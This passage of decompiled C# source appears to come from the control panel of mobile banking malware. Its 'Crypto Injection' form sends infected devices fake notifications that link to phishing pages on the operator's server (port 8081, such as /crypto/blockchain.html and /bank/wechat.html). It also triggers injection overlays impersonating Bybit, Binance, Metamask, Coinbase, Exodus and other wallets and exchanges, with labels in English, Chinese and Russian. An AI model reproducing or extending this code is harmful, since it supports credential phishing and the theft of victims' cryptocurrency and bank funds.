					string text = "http://" + this.ip.Text + ":8081/crypto/blockchain.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF6 RID: 3062 RVA: 0x00104404 File Offset: 0x00102604
		private void drakeUIButtonIcon96_Click(object sender, EventArgs e)
		{
			using (Dialogue3 dialogue = new Dialogue3())
			{
				DialogResult dialogResult = dialogue.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string bodyText = dialogue.BodyText;
					string messageText = dialogue.MessageText;
					string text = "http://" + this.ip.Text + ":8081/bank/wechat.html";
					string text2 = string.Concat(new string[] { bodyText, ">", messageText, ">2>", text, ">0>" });
					if (this.classClient != null)
					{
						try
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.classClient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"noti<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.classClient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		// Token: 0x06000BF7 RID: 3063 RVA: 0x001045DC File Offset: 0x001027DC
		private void drakeUIAvatar3_Click(object sender, EventArgs e)
		{
			string text = "Bybit";
			string[] array = this.classClient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(array2);
		}

		// Token: 0x06000BF8 RID: 3064 RVA: 0x00002423 File Offset: 0x00000623
		private void guna2GradientButton6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000BF9 RID: 3065 RVA: 0x001046F0 File Offset: 0x001028F0
		private void UpdateEnglish()
		{
			this.label8.Text = "Crypto Injection";
			this.drakeUIButtonIcon59.Text = "Push";
			this.drakeUIButtonIcon62.Text = "Push";
			this.drakeUIButtonIcon68.Text = "Push";
			this.drakeUIButtonIcon71.Text = "Push";
			this.drakeUIButtonIcon74.Text = "Push";
			this.drakeUIButtonIcon77.Text = "Push";
			this.drakeUIButtonIcon80.Text = "Push";
			this.drakeUIButtonIcon83.Text = "Push";
			this.drakeUIButtonIcon86.Text = "Push";
			this.drakeUIButtonIcon89.Text = "Push";
			this.drakeUIButtonIcon93.Text = "Push";
			this.drakeUIButtonIcon96.Text = "Push";
			this.drakeUIButtonIcon60.Text = "Show";
			this.drakeUIButtonIcon63.Text = "Show";
			this.drakeUIButtonIcon69.Text = "Show";
			this.drakeUIButtonIcon72.Text = "Show";
			this.drakeUIButtonIcon75.Text = "Show";
			this.drakeUIButtonIcon78.Text = "Show";
			this.drakeUIButtonIcon81.Text = "Show";
			this.drakeUIButtonIcon84.Text = "Show";
			this.drakeUIButtonIcon87.Text = "Show";
			this.drakeUIButtonIcon90.Text = "Show";
			this.drakeUIButtonIcon94.Text = "Show";
			this.drakeUIButtonIcon97.Text = "Show";
			this.drakeUIButtonIcon61.Text = "Inject";
			this.drakeUIButtonIcon64.Text = "Inject";
			this.drakeUIButtonIcon70.Text = "Inject";
			this.drakeUIButtonIcon73.Text = "Inject";
			this.drakeUIButtonIcon76.Text = "Inject";
			this.drakeUIButtonIcon79.Text = "Inject";
			this.drakeUIButtonIcon82.Text = "Inject";
			this.drakeUIButtonIcon85.Text = "Inject";
			this.drakeUIButtonIcon88.Text = "Inject";
			this.drakeUIButtonIcon91.Text = "Inject";
			this.drakeUIButtonIcon95.Text = "Inject";
			this.drakeUIButtonIcon98.Text = "Inject";
			this.guna2GradientButton1.Text = "Bybit";
			this.guna2GradientButton4.Text = "Kraken";
			this.guna2GradientButton3.Text = "Trustwallet";
			this.guna2GradientButton2.Text = "Binance";
			this.guna2GradientButton5.Text = "Huobi";
			this.guna2GradientButton10.Text = "Kucoin";
			this.guna2GradientButton7.Text = "Metamask";
			this.guna2GradientButton8.Text = "Exodus";
			this.guna2GradientButton9.Text = "Coinbase";
			this.guna2GradientButton6.Text = "Coinbase(W)";
			this.guna2GradientButton12.Text = "Blockchain";
			this.guna2GradientButton11.Text = "Wechat";
		}

		// Token: 0x06000BFA RID: 3066 RVA: 0x00104A10 File Offset: 0x00102C10
		private void UpdateChinese()
		{
			this.label8.Text = "加密注入";
			this.drakeUIButtonIcon59.Text = "推送";
			this.drakeUIButtonIcon62.Text = "推送";
			this.drakeUIButtonIcon68.Text = "推送";
			this.drakeUIButtonIcon71.Text = "推送";
			this.drakeUIButtonIcon74.Text = "推送";
			this.drakeUIButtonIcon77.Text = "推送";
			this.drakeUIButtonIcon80.Text = "推送";
			this.drakeUIButtonIcon83.Text = "推送";
			this.drakeUIButtonIcon86.Text = "推送";
			this.drakeUIButtonIcon89.Text = "推送";
			this.drakeUIButtonIcon93.Text = "推送";
			this.drakeUIButtonIcon96.Text = "推送";
			this.drakeUIButtonIcon60.Text = "显示";
			this.drakeUIButtonIcon63.Text = "显示";
			this.drakeUIButtonIcon69.Text = "显示";
			this.drakeUIButtonIcon72.Text = "显示";
			this.drakeUIButtonIcon75.Text = "显示";
			this.drakeUIButtonIcon78.Text = "显示";
			this.drakeUIButtonIcon81.Text = "显示";
			this.drakeUIButtonIcon84.Text = "显示";
			this.drakeUIButtonIcon87.Text = "显示";
			this.drakeUIButtonIcon90.Text = "显示";
			this.drakeUIButtonIcon94.Text = "显示";
			this.drakeUIButtonIcon97.Text = "显示";
			this.drakeUIButtonIcon61.Text = "注入";
			this.drakeUIButtonIcon64.Text = "注入";
			this.drakeUIButtonIcon70.Text = "注入";
			this.drakeUIButtonIcon73.Text = "注入";
			this.drakeUIButtonIcon76.Text = "注入";
			this.drakeUIButtonIcon79.Text = "注入";
			this.drakeUIButtonIcon82.Text = "注入";
			this.drakeUIButtonIcon85.Text = "注入";
			this.drakeUIButtonIcon88.Text = "注入";
			this.drakeUIButtonIcon91.Text = "注入";
			this.drakeUIButtonIcon95.Text = "注入";
			this.drakeUIButtonIcon98.Text = "注入";
			this.guna2GradientButton1.Text = "Bybit";
			this.guna2GradientButton4.Text = "Kraken";
			this.guna2GradientButton3.Text = "Trustwallet";
			this.guna2GradientButton2.Text = "Binance";
			this.guna2GradientButton5.Text = "Huobi";
			this.guna2GradientButton10.Text = "Kucoin";
			this.guna2GradientButton7.Text = "Metamask";
			this.guna2GradientButton8.Text = "Exodus";
			this.guna2GradientButton9.Text = "Coinbase";
			this.guna2GradientButton6.Text = "Coinbase(W)";
			this.guna2GradientButton12.Text = "Blockchain";
			this.guna2GradientButton11.Text = "Wechat";
		}

		// Token: 0x06000BFB RID: 3067 RVA: 0x00104D30 File Offset: 0x00102F30
		private void UpdateRussian()
		{
			this.label8.Text = "Крипто Инъекция";
			this.drakeUIButtonIcon59.Text = "Пуш";
			this.drakeUIButtonIcon62.Text = "Пуш";
			this.drakeUIButtonIcon68.Text = "Пуш";
			this.drakeUIButtonIcon71.Text = "Пуш";
			this.drakeUIButtonIcon74.Text = "Пуш";
			this.drakeUIButtonIcon77.Text = "Пуш";
			this.drakeUIButtonIcon80.Text = "Пуш";
			this.drakeUIButtonIcon83.Text = "Пуш";
			this.drakeUIButtonIcon86.Text = "Пуш";
			this.drakeUIButtonIcon89.Text = "Пуш";
			this.drakeUIButtonIcon93.Text = "Пуш";
			this.drakeUIButtonIcon96.Text = "Пуш";
			this.drakeUIButtonIcon60.Text = "Показать";
			this.drakeUIButtonIcon63.Text = "Показать";
			this.drakeUIButtonIcon69.Text = "Показать";
			this.drakeUIButtonIcon72.Text = "Показать";
			this.drakeUIButtonIcon75.Text = "Показать";
			this.drakeUIButtonIcon78.Text = "Показать";
			this.drakeUIButtonIcon81.Text = "Показать";
			this.drakeUIButtonIcon84.Text = "Показать";
			this.drakeUIButtonIcon87.Text = "Показать";
			this.drakeUIButtonIcon90.Text = "Показать";
			this.drakeUIButtonIcon94.Text = "Показать";
			this.drakeUIButtonIcon97.Text = "Показать";
			this.drakeUIButtonIcon61.Text = "Инъекция";
			this.drakeUIButtonIcon64.Text = "Инъекция";
			this.drakeUIButtonIcon70.Text = "Инъекция";
			this.drakeUIButtonIcon73.Text = "Инъекция";
			this.drakeUIButtonIcon76.Text = "Инъекция";
			this.drakeUIButtonIcon79.Text = "Инъекция";
			this.drakeUIButtonIcon82.Text = "Инъекция";
			this.drakeUIButtonIcon85.Text = "Инъекция";
			this.drakeUIButtonIcon88.Text = "Инъекция";
			this.drakeUIButtonIcon91.Text = "Инъекция";
			this.drakeUIButtonIcon95.Text = "Инъекция";
			this.drakeUIButtonIcon98.Text = "Инъекция";
			this.guna2GradientButton1.Text = "Bybit";
			this.guna2GradientButton4.Text = "Kraken";
			this.guna2GradientButton3.Text = "Trustwallet";
			this.guna2GradientButton2.Text = "Binance";
			this.guna2GradientButton5.Text = "Huobi";
			this.guna2GradientButton10.Text = "Kucoin";
			this.guna2GradientButton7.Text = "Metamask";
			this.guna2GradientButton8.Text = "Exodus";
			this.guna2GradientButton9.Text = "Coinbase";
			this.guna2GradientButton6.Text = "Coinbase(W)";
			this.guna2GradientButton12.Text = "Wechat";
			this.guna2GradientButton12.Text = "Blockchain";
			this.guna2GradientButton11.Text = "Wechat";
		}

		// Token: 0x06000BFC RID: 3068 RVA: 0x00105060 File Offset: 0x00103260
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x04000F02 RID: 3842
		public Client classClient;

		// Token: 0x04000F03 RID: 3843
		public string Title;

		// Token: 0x04000F04 RID: 3844
		public object firstclick;

		// Token: 0x04000F05 RID: 3845
		public Dictionary<string, string> MapData;

		// Token: 0x04000F06 RID: 3846
		public TcpClient Client;

		// Token: 0x04000F07 RID: 3847
		private int y;
	}
}
